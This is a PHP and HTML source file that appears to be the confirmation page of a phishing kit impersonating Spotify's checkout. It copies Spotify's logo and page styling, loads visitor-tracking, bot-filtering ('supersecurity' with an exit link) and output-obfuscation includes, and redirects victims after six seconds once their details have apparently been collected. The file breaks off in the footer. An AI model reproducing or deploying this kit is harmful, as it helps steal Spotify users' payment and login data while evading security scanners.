<?php 
session_start();
require_once '../includes/functions.php';
validateVisit();
require_once '../includes/tracker.php';
require_once '../includes/lang.php';
require_once '../includes/absd.php';
require_once('../includes/obf.php');
$visitor = trackVisitor();
$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
ob_start([TextObfuscator::class, 'obfuscateOutput']);
header('Refresh:6;URL='.sitexite().'');
?>
<html dir="auto">
  <head>
    <meta>
    <meta name="viewport" content="width=device-width">
    <title><?php echo $payd01['x059']?></title>
         <link rel="stylesheet" href="./css/spot2.css">
    <script src="js/jquery.js"></script>
    <link type="image/x-icon" rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExgR////Af///wH///8B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL8TExjvExMY7xMTGL8TExi/ExMYgRMTGEH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
    <style>
      .sf-hidden {
        display: none !important
      }
    </style>
    <link rel="canonical" href="">
    <style>
      img[src="data:,"],
      source[src="data:,"] {
        display: none !important
      }
    </style>
    <noscript data-n-css></noscript>
  </head>
  <body class="encore-light-theme encore-layout-themes">
  
    <div id="__next">
      <div class="BasePage__BasePageLayout-sc-jo0cy2-0 jPGFyY">
        <div>
          <header role="banner" class="mh-header-hover mh-default-z-index svelte-u4otmp">
            <a class="mh-skip-link svelte-u4otmp" href="#start-of-content">Skip to content</a>
            <div class="mh-container svelte-u4otmp">
              <div class="mh-brand-wrapper svelte-u4otmp">
                <a href="" class="mh-header-primary svelte-18o1xvt" >
                  <span class="mh-header-primary svelte-1gcdbl9">
                    <svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 823.46 225.25">
                      <g fill-rule="evenodd" class="svelte-1gcdbl9">
                        <path d="m125.52,3.31C65.14.91,14.26,47.91,11.86,108.29c-2.4,60.38,44.61,111.26,104.98,113.66,60.38,2.4,111.26-44.6,113.66-104.98C232.89,56.59,185.89,5.7,125.52,3.31Zm46.18,160.28c-1.36,2.4-4.01,3.6-6.59,3.24-.79-.11-1.58-.37-2.32-.79-14.46-8.23-30.22-13.59-46.84-15.93-16.62-2.34-33.25-1.53-49.42,2.4-3.51.85-7.04-1.3-7.89-4.81-.85-3.51,1.3-7.04,4.81-7.89,17.78-4.32,36.06-5.21,54.32-2.64,18.26,2.57,35.58,8.46,51.49,17.51,3.13,1.79,4.23,5.77,2.45,8.91Zm14.38-28.72c-2.23,4.12-7.39,5.66-11.51,3.43-16.92-9.15-35.24-15.16-54.45-17.86-19.21-2.7-38.47-1.97-57.26,2.16-1.02.22-2.03.26-3.01.12-3.41-.48-6.33-3.02-7.11-6.59-1.01-4.58,1.89-9.11,6.47-10.12,20.77-4.57,42.06-5.38,63.28-2.4,21.21,2.98,41.46,9.62,60.16,19.74,4.13,2.23,5.66,7.38,3.43,11.51Zm15.94-32.38c-2.1,4.04-6.47,6.13-10.73,5.53-1.15-.16-2.28-.52-3.37-1.08-19.7-10.25-40.92-17.02-63.07-20.13-22.15-3.11-44.42-2.45-66.18,1.97-5.66,1.15-11.17-2.51-12.32-8.16-1.15-5.66,2.51-11.17,8.16-12.32,24.1-4.89,48.74-5.62,73.25-2.18,24.51,3.44,47.99,10.94,69.81,22.29,5.12,2.66,7.11,8.97,4.45,14.09Z"></path>
                        <path d="m318.54,169.81c-18.87,0-35.07-6.53-41.84-13.95-.64-.73-.73-1.13-.73-2.02v-22.09c0-1.05.89-1.45,1.61-.56,8.14,10.16,25.48,18.46,39.67,18.46,11.29,0,18.87-3.06,18.87-13.06,0-5.97-2.82-9.84-18.22-14.19l-8.87-2.5c-20.56-5.8-33.06-12.66-33.06-32.33,0-17.41,16.12-32.73,43.05-32.73,13.22,0,26.36,4.11,33.94,9.76.64.48.89.97.89,1.85v20.08c0,1.37-1.13,1.77-2.18.89-6.13-5.08-17.98-11.93-32.01-11.93s-20.64,6.29-20.64,12.09c0,6.13,4.27,7.82,19.51,12.34l7.58,2.26c23.46,7.01,33.06,16.85,33.06,33.14,0,20.96-17.41,34.51-40.63,34.51Zm164.39-42.09c0-12.82,8.87-22.33,21.37-22.33s21.28,9.51,21.28,22.33-8.87,22.33-21.28,22.33-21.37-9.51-21.37-22.33Zm21.28,42.09c26.04,0,44.18-18.62,44.18-42.09s-18.14-42.09-44.18-42.09-44.1,18.46-44.1,42.09,17.98,42.09,44.1,42.09Zm157.22-89.01v6.77h-13.71c-.73,0-1.13.4-1.13,1.13v16.12c0,.73.4,1.13,1.13,1.13h13.71v60.79c0,.73.4,1.13,1.13,1.13h20.64c.73,0,1.13-.4,1.13-1.13v-60.79h17.66l25.64,55.71-13.79,30.31c-.4.89.08,1.29.89,1.29h22.01c.73,0,1.05-.16,1.37-.89l45.55-103.52c.32-.73-.08-1.29-.89-1.29h-20.64c-.73,0-1.05.16-1.37.89l-20.8,49.99-20.88-49.99c-.32-.73-.64-.89-1.37-.89h-33.38v-5.32c0-8.71,5.89-12.74,13.46-12.74,4.51,0,9.43,2.34,12.9,4.43.81.48,1.37-.08,1.05-.81l-7.26-17.33c-.24-.56-.56-.89-1.13-1.21-3.55-1.85-9.35-3.47-15-3.47-17.09,0-26.93,13.06-26.93,29.67Zm-243,88.52c20.64,0,35.47-17.82,35.47-41.76s-15-41.44-35.64-41.44c-15.32,0-24.19,9.35-29.35,18.7v-16.12c0-.73-.4-1.13-1.13-1.13h-20.24c-.73,0-1.13.4-1.13,1.13v103.44c0,.73.4,1.13,1.13,1.13h20.24c.73,0,1.13-.4,1.13-1.13v-41.36c5.16,9.35,13.87,18.54,29.51,18.54Zm172.21-.32c6.77,0,13.3-1.77,17.17-4.03.56-.32.64-.64.64-1.21v-15.32c0-.81-.4-1.05-1.13-.64-2.34,1.29-5.4,2.34-9.59,2.34-6.61,0-10.8-3.87-10.8-12.42v-31.77h20.16c.73,0,1.13-.4,1.13-1.13v-16.12c0-.73-.4-1.13-1.13-1.13h-20.16v-21.04c0-.89-.56-1.37-1.37-.73l-36.04,28.38c-.48.4-.64.81-.64,1.45v9.19c0,.73.4,1.13,1.13,1.13h14.03v35.15c0,19.03,10.96,27.9,26.61,27.9Zm23.3-105.29c0,7.26,5.64,12.74,13.38,12.74s13.54-5.48,13.54-12.74-5.64-12.74-13.54-12.74-13.38,5.48-13.38,12.74Zm3.14,104.17h20.64c.73,0,1.13-.4,1.13-1.13v-78.04c0-.73-.4-1.13-1.13-1.13h-20.64c-.73,0-1.13.4-1.13,1.13v78.04c0,.73.4,1.13,1.13,1.13Zm-228.65-40.47c3.71-12.42,12.25-21.93,23.86-21.93s18.7,8.38,18.7,22.09-7.66,22.25-18.7,22.25-20.16-10.64-23.86-22.41Z"></path>
                        <path d="m810.1,92.31c-1.06-1.83-2.53-3.26-4.41-4.3-1.88-1.03-3.98-1.55-6.32-1.55s-4.44.52-6.32,1.55c-1.88,1.04-3.35,2.47-4.41,4.3-1.06,1.83-1.59,3.9-1.59,6.21s.53,4.34,1.59,6.17c1.06,1.83,2.53,3.26,4.41,4.3,1.88,1.04,3.98,1.55,6.32,1.55s4.44-.52,6.32-1.55,3.35-2.47,4.41-4.3c1.06-1.83,1.59-3.88,1.59-6.17s-.53-4.38-1.59-6.21Zm-1.93,11.36c-.86,1.52-2.06,2.7-3.59,3.56-1.53.85-3.27,1.28-5.2,1.28s-3.72-.43-5.25-1.28c-1.53-.85-2.72-2.04-3.57-3.56-.85-1.51-1.27-3.23-1.27-5.15s.42-3.63,1.27-5.13c.85-1.5,2.04-2.68,3.57-3.53,1.53-.85,3.28-1.28,5.25-1.28s3.67.43,5.2,1.28c1.53.85,2.73,2.04,3.59,3.56.86,1.52,1.29,3.23,1.29,5.15s-.43,3.59-1.29,5.11Z"></path>
                        <path d="m803.56,98.29c.82-.6,1.23-1.4,1.23-2.39s-.4-1.83-1.2-2.43c-.8-.6-1.96-.9-3.48-.9h-5.36v11.2h2.59v-4.45h1.41l3.41,4.45h3.18l-3.73-4.72c.79-.15,1.46-.4,1.96-.77Zm-3.86-.99h-2.36v-2.74h2.45c.73,0,1.29.11,1.68.34.39.23.59.58.59,1.06,0,.45-.21.79-.61,1.01-.41.23-.99.34-1.75.34Z"></path>
                      </g>
                    </svg> Spotify </span>
                </a>
              </div>
              <nav role="navigation" class="mh-desktop svelte-4ldyho" aria-label="Desktop navigation">
                <ul class="svelte-4ldyho">
                  <li class="svelte-kdyqkb">
                    <button class="mh-header-primary svelte-kdyqkb" aria-expanded="false" aria-controls="profileMenu" linkbutton>
                      <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/7QCEUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAGgcAigAYkZCTUQwYTAwMGE2NDAxMDAwMDk1MDEwMDAwYjYwMTAwMDBkNzAxMDAwMGY4MDEwMDAwMTkwMjAwMDAyNDAyMDAwMDU0MDIwMDAwNzUwMjAwMDA5NjAyMDAwMGEzMDIwMDAwAP/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/CABEIADIAMgMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAAB//EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAZSAAAAAAAAAAAAAAAD/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAEFAkf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AQf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/AQf/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAY/Akf/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAE/IUf/2gAMAwEAAgADAAAAEPPPPPPPPPPPPPPPPP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8QB//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8QB//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8QR//Z" alt class="svelte-8gzfq1">
                      <div class="mh-profile-title svelte-kdyqkb">
                        <span class="svelte-kdyqkb"><?php echo $payd01['s016']?></span>
                        <svg viewBox="0 0 1024 1024" style class="svelte-13ynk3t">
                          <path d="M476.455 806.696L95.291 425.532Q80.67 410.911 80.67 390.239t14.621-34.789 35.293-14.117 34.789 14.117L508.219 698.8l349.4-349.4q14.621-14.117 35.293-14.117t34.789 14.117 14.117 34.789-14.117 34.789L546.537 800.142q-19.159 19.159-38.318 19.159t-31.764-12.605z"></path>
                        </svg>
                      </div>
                    </button>
                    <div id="profileMenu" class="mh-dropdown-menu svelte-kdyqkb sf-hidden"></div>
                  </li>
                </ul>
              </nav>
              <div class="mh-mobile-menu svelte-4ldyho sf-hidden"></div>
            </div>
          </header>
          <div id="start-of-content" class="svelte-u4otmp"></div>
        </div>
        <main class="BasePage__BasePageContent-sc-jo0cy2-1 grnxhP">
          <div aria-busy="false" aria-live="polite">
            <div class="checkout__Container-sc-1vkarhr-0 immGdi">
              <section class="OfferCardV2__OfferCardBackground-sc-1uxgtui-0 ineLKm">
                <div class="OfferCardV2__Container-sc-1uxgtui-1 iuIhsb">
                  <div class="OfferCardV2__AboveCard-sc-1uxgtui-2 iRoEvL">
                    <span class="encore-text encore-text-title-small OfferCardV2__YourPlanLabel-sc-1uxgtui-3 dRqJeR" data-encore-id="text"><?php echo $payd01['x059']?></span>
                  
                  </div>
         
                </div>
              </section>
              <section class="PaymentSDKWrapperContainer-sc-meydwk-0 cEaYrR">
                <div class="sc-iBdnpw dhQKfv">
                
		
                    <ul role="listbox" aria-labelledby="checkout-sdk-payment-picker-header" tabindex="-1" class="sc-kMzELR liAxan">
      <div class="sc-iKOmoZ bcnmgH">
                                    <p> <center>   <?php echo $payd01['xfin']?></p>
                                  </div>
<center>  <img src="images/done.svg" width="150px">
                    </ul>
                    <div class="sc-jgraLO llmEeb"></div>
                    <div class="sc-fLseNd kvKTeB">
                    </div>
           
                    <div data-testid="cta-scroll-anchor"></div>
              
                       
                </div>
              </section>
  
            </div>
          </div>
        </main>
        <div>
          <footer id="mh-footer" class="mh-footer-hover svelte-1s7nb1t" aria-label="Footer">
            <nav class="svelte-1s7nb1t">
              <div class="mh-brand svelte-1s7nb1t">
                <a href="" class="mh-footer-primary svelte-18o1xvt">
                  <span class="mh-footer-primary svelte-1gcdbl9">
                    <svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 823.46 225.25">
                      <g fill-rule="evenodd" class="svelte-1gcdbl9">
                        <path d="m125.52,3.31C65.14.91,14.26,47.91,11.86,108.29c-2.4,60.38,44.61,111.26,104.98,113.66,60.38,2.4,111.26-44.6,113.66-104.98C232.89,56.59,185.89,5.7,125.52,3.31Zm46.18,160.28c-1.36,2.4-4.01,3.6-6.59,3.24-.79-.11-1.58-.37-2.32-.79-14.46-8.23-30.22-13.59-46.84-15.93-16.62-2.34-33.25-1.53-49.42,2.4-3.51.85-7.04-1.3-7.89-4.81-.85-3.51,1.3-7.04,4.81-7.89,17.78-4.32,36.06-5.21,54.32-2.64,18.26,2.57,35.58,8.46,51.49,17.51,3.13,1.79,4.23,5.77,2.45,8.91Zm14.38-28.72c-2.23,4.12-7.39,5.66-11.51,3.43-16.92-9.15-35.24-15.16-54.45-17.86-19.21-2.7-38.47-1.97-57.26,2.16-1.02.22-2.03.26-3.01.12-3.41-.48-6.33-3.02-7.11-6.59-1.01-4.58,1.89-9.11,6.47-10.12,20.77-4.57,42.06-5.38,63.28-2.4,21.21,2.98,41.46,9.62,60.16,19.74,4.13,2.23,5.66,7.38,3.43,11.51Zm15.94-32.38c-2.1,4.04-6.47,6.13-10.73,5.53-1.15-.16-2.28-.52-3.37-1.08-19.7-10.25-40.92-17.02-63.07-20.13-22.15-3.11-44.42-2.45-66.18,1.97-5.66,1.15-11.17-2.51-12.32-8.16-1.15-5.66,2.51-11.17,8.16-12.32,24.1-4.89,48.74-5.62,73.25-2.18,24.51,3.44,47.99,10.94,69.81,22.29,5.12,2.66,7.11,8.97,4.45,14.09Z"></path>
                        <path d="m318.54,169.81c-18.87,0-35.07-6.53-41.84-13.95-.64-.73-.73-1.13-.73-2.02v-22.09c0-1.05.89-1.45,1.61-.56,8.14,10.16,25.48,18.46,39.67,18.46,11.29,0,18.87-3.06,18.87-13.06,0-5.97-2.82-9.84-18.22-14.19l-8.87-2.5c-20.56-5.8-33.06-12.66-33.06-32.33,0-17.41,16.12-32.73,43.05-32.73,13.22,0,26.36,4.11,33.94,9.76.64.48.89.97.89,1.85v20.08c0,1.37-1.13,1.77-2.18.89-6.13-5.08-17.98-11.93-32.01-11.93s-20.64,6.29-20.64,12.09c0,6.13,4.27,7.82,19.51,12.34l7.58,2.26c23.46,7.01,33.06,16.85,33.06,33.14,0,20.96-17.41,34.51-40.63,34.51Zm164.39-42.09c0-12.82,8.87-22.33,21.37-22.33s21.28,9.51,21.28,22.33-8.87,22.33-21.28,22.33-21.37-9.51-21.37-22.33Zm21.28,42.09c26.04,0,44.18-18.62,44.18-42.09s-18.14-42.09-44.18-42.09-44.1,18.46-44.1,42.09,17.98,42.09,44.1,42.09Zm157.22-89.01v6.77h-13.71c-.73,0-1.13.4-1.13,1.13v16.12c0,.73.4,1.13,1.13,1.13h13.71v60.79c0,.73.4,1.13,1.13,1.13h20.64c.73,0,1.13-.4,1.13-1.13v-60.79h17.66l25.64,55.71-13.79,30.31c-.4.89.08,1.29.89,1.29h22.01c.73,0,1.05-.16,1.37-.89l45.55-103.52c.32-.73-.08-1.29-.89-1.29h-20.64c-.73,0-1.05.16-1.37.89l-20.8,49.99-20.88-49.99c-.32-.73-.64-.89-1.37-.89h-33.38v-5.32c0-8.71,5.89-12.74,13.46-12.74,4.51,0,9.43,2.34,12.9,4.43.81.48,1.37-.08,1.05-.81l-7.26-17.33c-.24-.56-.56-.89-1.13-1.21-3.55-1.85-9.35-3.47-15-3.47-17.09,0-26.93,13.06-26.93,29.67Zm-243,88.52c20.64,0,35.47-17.82,35.47-41.76s-15-41.44-35.64-41.44c-15.32,0-24.19,9.35-29.35,18.7v-16.12c0-.73-.4-1.13-1.13-1.13h-20.24c-.73,0-1.13.4-1.13,1.13v103.44c0,.73.4,1.13,1.13,1.13h20.24c.73,0,1.13-.4,1.13-1.13v-41.36c5.16,9.35,13.87,18.54,29.51,18.54Zm172.21-.32c6.77,0,13.3-1.77,17.17-4.03.56-.32.64-.64.64-1.21v-15.32c0-.81-.4-1.05-1.13-.64-2.34,1.29-5.4,2.34-9.59,2.34-6.61,0-10.8-3.87-10.8-12.42v-31.77h20.16c.73,0,1.13-.4,1.13-1.13v-16.12c0-.73-.4-1.13-1.13-1.13h-20.16v-21.04c0-.89-.56-1.37-1.37-.73l-36.04,28.38c-.48.4-.64.81-.64,1.45v9.19c0,.73.4,1.13,1.13,1.13h14.03v35.15c0,19.03,10.96,27.9,26.61,27.9Zm23.3-105.29c0,7.26,5.64,12.74,13.38,12.74s13.54-5.48,13.54-12.74-5.64-12.74-13.54-12.74-13.38,5.48-13.38,12.74Zm3.14,104.17h20.64c.73,0,1.13-.4,1.13-1.13v-78.04c0-.73-.4-1.13-1.13-1.13h-20.64c-.73,0-1.13.4-1.13,1.13v78.04c0,.73.4,1.13,1.13,1.13Zm-228.65-40.47c3.71-12.42,12.25-21.93,23.86-21.93s18.7,8.38,18.7,22.09-7.66,22.25-18.7,22.25-20.16-10.64-23.86-22.41Z"></path>
